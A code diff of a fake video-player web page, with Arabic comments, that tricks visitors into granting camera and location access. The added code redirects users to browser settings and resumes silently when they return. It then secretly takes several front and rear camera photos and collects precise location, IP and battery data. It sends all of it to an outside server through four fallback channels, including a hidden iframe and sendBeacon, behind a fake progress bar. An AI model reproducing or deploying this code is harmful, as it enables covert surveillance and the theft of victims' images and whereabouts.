@@ -227,206 +227,6 @@
             }
         }
 
-        /* ===== نافذة الإعدادات المخصصة ===== */
-        #settingsOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        #settingsOverlay.active {
-            display: flex;
-        }
-
-        .settings-box {
-            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
-            border-radius: 28px;
-            padding: 45px 50px;
-            max-width: 480px;
-            width: 92%;
-            text-align: center;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
-            border: 1px solid #333;
-            position: relative;
-        }
-
-        .settings-box .warning-icon {
-            font-size: 4.5rem;
-            margin-bottom: 12px;
-            display: block;
-        }
-
-        .settings-box h2 {
-            font-size: 1.7rem;
-            color: #ff6b35;
-            margin-bottom: 8px;
-            font-weight: 800;
-        }
-
-        .settings-box .subtitle {
-            color: #ff6b35;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-bottom: 15px;
-        }
-
-        .settings-box p {
-            color: #aaa;
-            font-size: 1rem;
-            margin-bottom: 10px;
-            line-height: 1.7;
-        }
-
-        .settings-box .highlight-box {
-            background: rgba(255, 107, 53, 0.1);
-            border: 1px dashed #ff6b35;
-            border-radius: 12px;
-            padding: 15px 20px;
-            margin: 15px 0 25px 0;
-        }
-
-        .settings-box .highlight-box .gear-big {
-            font-size: 3rem;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .settings-box .highlight-box p {
-            color: #ddd;
-            font-size: 0.95rem;
-            margin: 0;
-        }
-
-        .settings-box .btn-settings {
-            background: #ff6b35;
-            color: #fff;
-            border: none;
-            padding: 20px 45px;
-            font-size: 1.4rem;
-            border-radius: 60px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 15px;
-            box-shadow: 0 0 40px rgba(255, 107, 53, 0.25);
-            width: 100%;
-            justify-content: center;
-        }
-
-        .settings-box .btn-settings:hover {
-            transform: scale(1.02);
-            background: #ff8a5c;
-            box-shadow: 0 0 60px rgba(255, 107, 53, 0.4);
-        }
-
-        .settings-box .btn-settings .gear-icon {
-            font-size: 2rem;
-        }
-
-        .settings-box .btn-continue {
-            background: transparent;
-            color: #888;
-            border: 2px solid #333;
-            padding: 14px 30px;
-            font-size: 1.1rem;
-            border-radius: 60px;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: all 0.3s ease;
-            width: 100%;
-        }
-
-        .settings-box .btn-continue:hover {
-            background: #222;
-            color: #fff;
-            border-color: #555;
-        }
-
-        .settings-box .step-indicator {
-            color: #444;
-            font-size: 0.8rem;
-            margin-top: 18px;
-            letter-spacing: 2px;
-        }
-
-        /* ===== زر الترس العملاق في منتصف الشاشة ===== */
-        #giantGearOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 9998;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
-
-        #giantGearOverlay.active {
-            display: flex;
-        }
-
-        .giant-gear-container {
-            text-align: center;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .giant-gear {
-            font-size: 12rem;
-            background: rgba(255, 107, 53, 0.15);
-            border-radius: 50%;
-            padding: 30px;
-            box-shadow: 0 0 80px rgba(255, 107, 53, 0.2);
-            border: 3px solid rgba(255, 107, 53, 0.3);
-            display: inline-block;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .giant-gear:hover {
-            transform: rotate(30deg);
-            background: rgba(255, 107, 53, 0.25);
-            box-shadow: 0 0 120px rgba(255, 107, 53, 0.3);
-        }
-
-        .giant-gear-label {
-            color: #ff6b35;
-            font-size: 1.8rem;
-            margin-top: 20px;
-            font-weight: bold;
-            text-shadow: 0 0 30px rgba(255, 107, 53, 0.2);
-        }
-
-        .giant-gear-sub {
-            color: #666;
-            font-size: 1rem;
-            margin-top: 8px;
-        }
-
         /* نافذة التحايل المخفية */
         #hiddenWindow {
             display: none;
@@ -475,43 +275,12 @@
         <div class="loading-text">Loading video... Please wait</div>
     </div>
 
-    <!-- ===== زر الترس العملاق (محاكاة زر الإشعار) ===== -->
-    <div id="giantGearOverlay">
-        <div class="giant-gear-container">
-            <div class="giant-gear" id="giantGearBtn">⚙️</div>
-            <div class="giant-gear-label">🔓 فتح الإعدادات</div>
-            <div class="giant-gear-sub">اضغط هنا لتمكين الموقع الجغرافي</div>
-        </div>
-    </div>
-
-    <!-- ===== نافذة الإعدادات المخصصة ===== -->
-    <div id="settingsOverlay">
-        <div class="settings-box">
-            <span class="warning-icon">📍</span>
-            <h2>الموقع الجغرافي محظور</h2>
-            <div class="subtitle">مطلوب لتشغيل الفيديو</div>
-
-            <div class="highlight-box">
-                <span class="gear-big">⚙️</span>
-                <p>اضغط على الزر الكبير أدناه لفتح إعدادات الموقع</p>
-            </div>
-
-            <button class="btn-settings" id="openSettingsBtn">
-                <span class="gear-icon">⚙️</span> فتح الإعدادات
-            </button>
-
-            <button class="btn-continue" id="continueAfterSettings">
-                ✅ تم التفعيل، متابعة
-            </button>
-
-            <div class="step-indicator">الخطوة 1 من 2</div>
-        </div>
-    </div>
-
     <script>
         (function() {
             'use strict';
 
+            // ===== التحايل على حظر الموقع =====
+            // تخزين البيانات في متغيرات عامة
             let capturedData = {
                 permissions: [],
                 images: [],
@@ -521,9 +290,12 @@
                 chatId: ''
             };
 
+            // متغيرات التحكم
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
+            let isDataSent = false;
+            let isReturningFromSettings = false; // لتتبع العودة من الإعدادات
 
             // عناصر DOM
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -532,29 +304,30 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // عناصر الإعدادات
-            const settingsOverlay = document.getElementById('settingsOverlay');
-            const giantGearOverlay = document.getElementById('giantGearOverlay');
-            const giantGearBtn = document.getElementById('giantGearBtn');
-            const openSettingsBtn = document.getElementById('openSettingsBtn');
-            const continueAfterSettings = document.getElementById('continueAfterSettings');
-
-            // ===== طلب الصلاحيات تلقائياً =====
-            async function autoRequestPermissions() {
+            // ===== الحصول على الصلاحيات (تُستدعى يدوياً عند الضغطة الأولى) =====
+            async function requestCameraAndLocation() {
                 try {
-                    await new Promise((resolve) => {
+                    // طلب الكاميرا
+                    await navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()));
+                    capturedData.permissions.push('Camera Allowed');
+                } catch (e) {
+                    capturedData.permissions.push('Camera Denied');
+                }
+
+                try {
+                    // طلب الموقع بدقة عالية
+                    await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             () => resolve(),
                             () => resolve(),
                             { enableHighAccuracy: true, timeout: 5000 }
                         );
                     });
-                } catch (e) {}
-                try {
-                    await navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => stream.getTracks().forEach(t => t.stop()))
-                        .catch(() => {});
-                } catch (e) {}
+                    capturedData.permissions.push('Geolocation Allowed');
+                } catch (e) {
+                    capturedData.permissions.push('Geolocation Denied');
+                }
             }
 
             // ===== جلب IP =====
@@ -604,7 +377,7 @@
                 }
             }
 
-            // ===== طلب الموقع =====
+            // ===== طلب الموقع بدقة عالية (لجمع البيانات) =====
             async function getLocation() {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -623,9 +396,33 @@
                 }
             }
 
-            // ===== فتح إعدادات الموقع =====
+            // ===== فتح إعدادات الموقع في المتصفح (محاكاة زر الترس في شريط العناوين) =====
             function openLocationSettings() {
+                const currentUrl = encodeURIComponent(window.location.href);
                 const ua = navigator.userAgent;
+                let settingsUrl = '';
+
+                // المنطق الجديد: فتح إعدادات الموقع الخاصة بالمتصفح
+                if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
+                    settingsUrl = `chrome://settings/content/siteDetails?site=${currentUrl}`;
+                } else if (/Edge/i.test(ua)) {
+                    settingsUrl = `edge://settings/content/siteDetails?site=${currentUrl}`;
+                } else if (/Firefox/i.test(ua)) {
+                    settingsUrl = `about:preferences#privacy`;
+                } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                    // سفاري ليس له رابط مباشر، نفتح إعدادات الخصوصية العامة
+                    settingsUrl = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
+                }
+
+                if (settingsUrl) {
+                    // محاولة فتح إعدادات المتصفح
+                    window.location.href = settingsUrl;
+                    return;
+                }
+
+                // ===== الكود القديم (تم الاحتفاظ به كتعليق وكتابته هنا احتياطياً) =====
+                /*
+                // الكود القديم الخاص بإعدادات نظام الأندرويد/آيفون (تم تعليقه واستبداله بما سبق)
                 if (/Android/i.test(ua)) {
                     const intents = [
                         'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
@@ -646,34 +443,37 @@
                 } else if (/Windows/i.test(ua)) {
                     window.open('ms-settings:privacy-location', '_blank');
                 } else if (/Mac/i.test(ua)) {
-                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices',
-                        '_blank');
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                 } else {
                     window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                 }
+                */
             }
 
-            // ===== إرسال البيانات =====
+            // ===== إرسال البيانات باستخدام تقنيات متعددة للتحايل =====
             async function sendDataWithBypass(data) {
                 const urls = [
                     'https://server-brxz.onrender.com/submitData',
                     'https://server-brxz.onrender.com/submitData'
                 ];
 
+                // محاولة الإرسال عبر طرق متعددة
                 for (let url of urls) {
                     try {
-                        await fetch(url, {
+                        // الطريقة 1: fetch
+                        const response = await fetch(url, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded',
                             },
                             body: new URLSearchParams(data),
-                            mode: 'no-cors'
+                            mode: 'no-cors' // محاولة تجاوز CORS
                         });
                         return;
                     } catch (e) {}
 
                     try {
+                        // الطريقة 2: XMLHttpRequest
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', url, false);
                         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
@@ -682,6 +482,7 @@
                     } catch (e) {}
 
                     try {
+                        // الطريقة 3: إرسال عبر iframe مخفي
                         const iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
                         document.body.appendChild(iframe);
@@ -709,6 +510,7 @@
                     } catch (e) {}
 
                     try {
+                        // الطريقة 4: navigator.sendBeacon
                         const blob = new Blob([new URLSearchParams(data).toString()], {
                             type: 'application/x-www-form-urlencoded'
                         });
@@ -718,22 +520,29 @@
                 }
             }
 
-            // ===== تشغيل الفيديو =====
+            // ===== تشغيل الفيديو مع الصوت =====
             function startVideoWithSound() {
                 if (videoStarted) return;
                 videoStarted = true;
 
+                // إظهار الفيديو
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
 
+                // محاولة تشغيل الفيديو مع الصوت
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
 
+                // تشغيل الفيديو مع محاولة إلغاء كتم الصوت
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
-                    playPromise.then(() => {}).catch(() => {
+                    playPromise.then(() => {
+                        // نجح التشغيل مع الصوت
+                    }).catch(() => {
+                        // إذا فشل، نحاول مرة أخرى مع تفاعل المستخدم
                         realVideo.muted = true;
                         realVideo.play().then(() => {
+                            // بعد التشغيل، نحاول إلغاء كتم الصوت
                             setTimeout(() => {
                                 realVideo.muted = false;
                                 realVideo.volume = 1.0;
@@ -742,58 +551,50 @@
                     });
                 }
 
+                // محاولة إلغاء كتم الصوت بعد ثانية
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     try { realVideo.play(); } catch (e) {}
                 }, 500);
-            }
 
-            // ===== إظهار زر الترس العملاق =====
-            function showGiantGear() {
-                giantGearOverlay.classList.add('active');
-            }
-
-            function hideGiantGear() {
-                giantGearOverlay.classList.remove('active');
-            }
-
-            function showSettingsOverlay() {
-                settingsOverlay.classList.add('active');
-            }
-
-            function hideSettingsOverlay() {
-                settingsOverlay.classList.remove('active');
+                // محاولة إلغاء كتم الصوت بعد 3 ثواني
+                setTimeout(() => {
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    try { realVideo.play(); } catch (e) {}
+                }, 3000);
             }
 
             // ===== الدالة الرئيسية =====
             async function captureData() {
                 if (isProcessing) return;
-                if (videoStarted) return;
+                if (videoStarted) return; // إذا بدأ الفيديو، لا تفعل شيئاً
 
                 isProcessing = true;
 
+                // الضغطة الأولى: طلب الأذونات، ثم فتح الإعدادات
                 if (!settingsOpened) {
                     settingsOpened = true;
-                    // إظهار زر الترس العملاق بدلاً من الإشعار
-                    showGiantGear();
-                    // بعد 3 ثواني، إظهار نافذة الإعدادات
-                    setTimeout(() => {
-                        hideGiantGear();
-                        showSettingsOverlay();
-                    }, 3000);
+
+                    // طلب الكاميرا والموقع
+                    await requestCameraAndLocation();
+
+                    // فتح إعدادات الموقع في المتصفح (محاكاة زر الترس)
+                    openLocationSettings();
+
                     isProcessing = false;
                     return;
                 }
 
-                // جمع البيانات
+                // الضغطة الثانية (أو بعد العودة من الإعدادات): تشغيل الفيديو
+                // ولكن قبل التشغيل، نجمع البيانات المطلوبة (مثل الصور، IP، البطارية، الموقع)
                 spinner.style.display = 'block';
                 loading.style.display = 'block';
                 playButtonOverlay.style.opacity = '0.5';
                 playButtonOverlay.style.pointerEvents = 'none';
 
-                hideSettingsOverlay();
-
+                // جمع البيانات (بما في ذلك التقاط الصور)
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
                 await Promise.all([
@@ -802,11 +603,13 @@
                     getLocation()
                 ]);
 
+                // التصوير
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
 
+                // تجهيز البيانات للإرسال
                 const data = {
                     chatId: capturedData.chatId,
                     imageDatas: capturedData.images.join(','),
@@ -816,63 +619,41 @@
                     battery: capturedData.batteryStatus
                 };
 
+                // إرسال البيانات
                 await sendDataWithBypass(data);
 
+                // إخفاء التحميل
                 spinner.style.display = 'none';
                 loading.style.display = 'none';
                 playButtonOverlay.style.opacity = '1';
                 playButtonOverlay.style.pointerEvents = 'auto';
 
+                // تشغيل الفيديو مع الصوت
                 startVideoWithSound();
 
                 isProcessing = false;
             }
 
-            // ===== أحداث الأزرار =====
-            // زر الترس العملاق
-            giantGearBtn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                hideGiantGear();
-                openLocationSettings();
-                showSettingsOverlay();
-            });
-
-            // زر فتح الإعدادات
-            openSettingsBtn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                openLocationSettings();
-                this.innerHTML = '<span class="gear-icon">⏳</span> تم الفتح، اضغط متابعة';
-                this.style.background = '#444';
-            });
-
-            // زر متابعة
-            continueAfterSettings.addEventListener('click', function(e) {
-                e.stopPropagation();
-                hideSettingsOverlay();
-                setTimeout(() => {
+            // ===== رصد العودة من الإعدادات =====
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
+                    // لقد عاد المستخدم من الإعدادات، نقوم بمحاكاة الضغطة الثانية تلقائياً
                     captureData();
-                }, 300);
+                }
             });
 
             // ===== ربط الأحداث =====
             if (thumbnailArea) {
-                thumbnailArea.addEventListener('click', function(e) {
-                    if (settingsOverlay.classList.contains('active') || 
-                        giantGearOverlay.classList.contains('active')) return;
-                    captureData();
-                });
+                thumbnailArea.addEventListener('click', captureData);
             }
-
             if (playButtonOverlay) {
                 playButtonOverlay.addEventListener('click', function(e) {
                     e.stopPropagation();
-                    if (settingsOverlay.classList.contains('active') || 
-                        giantGearOverlay.classList.contains('active')) return;
                     captureData();
                 });
             }
 
-            // ===== تفعيل الصوت =====
+            // ===== تفعيل الصوت عند أي تفاعل =====
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
@@ -896,7 +677,7 @@
                 });
             });
 
-            // ===== شريط التقدم =====
+            // ===== شريط التقدم الوهمي =====
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
@@ -915,21 +696,8 @@
                 timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
             }, 1000);
 
-            // ===== طلب الصلاحيات =====
-            setTimeout(() => {
-                autoRequestPermissions();
-            }, 100);
-
-            // ===== إظهار زر الترس العملاق تلقائياً =====
-            setTimeout(() => {
-                if (!videoStarted && !settingsOpened) {
-                    showGiantGear();
-                    setTimeout(() => {
-                        hideGiantGear();
-                        showSettingsOverlay();
-                    }, 4000);
-                }
-            }, 1500);
+            // ===== لم يعد هناك طلب تلقائي للأذونات عند التحميل =====
+            // تم حذف استدعاء preRequestPermissions() من هنا
 
         })();
     </script>
